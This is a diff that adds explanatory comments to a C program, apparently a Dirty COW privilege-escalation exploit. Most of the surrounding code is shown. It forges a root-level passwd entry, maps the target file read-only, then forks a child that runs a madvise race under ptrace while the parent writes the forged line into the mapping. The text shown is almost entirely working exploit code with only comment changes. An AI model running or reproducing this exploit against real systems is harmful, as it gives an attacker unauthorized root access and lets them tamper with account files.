@@ -32,7 +32,7 @@ struct UserDetails {
    char *home_directory;
    char *shell;
 };
-
+//format user details into a valid passwd entry
 char *format_passwd_entry(struct UserDetails user) {
   const char *template = "%s:%s:%d:%d:%s:%s:%s\n";  
 
@@ -66,19 +66,22 @@ int main() {
   user.info = "compromised";
   user.home_directory = "/root";
   user.shell = "/bin/bash";
-
+   
+   // Generate password hash
   user.password_hash = crypt(password, hash_salt);
   char *passwd_line = format_passwd_entry(user);  
   printf("Generated entry:\n%s\n", passwd_line);  
 
+      // Open target file and map it to memory
   file_descriptor = open(target_file, O_RDONLY);
   fstat(file_descriptor, &file_info);  
   mapped_memory = mmap(NULL, file_info.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, file_descriptor, 0);
   printf("Memory map created at: %lx\n", (unsigned long)mapped_memory);  
 
+   // Fork process for attack
   process_id = fork();
   if(process_id) {
-
+// Parent process - ptrace to modify memory
     waitpid(process_id, NULL, 0);
     int u = 0, i = 0, o = 0, count = 0;
     int length = strlen(passwd_line);  
@@ -97,7 +100,7 @@ int main() {
     }
     printf("ptrace write count: %d\n", count);  
   } else {
-
+   // Child process - runs madvise attack
     pthread_create(&thread, NULL, run_madvise, NULL);
     ptrace(PTRACE_TRACEME);  
     kill(getpid(), SIGSTOP);  
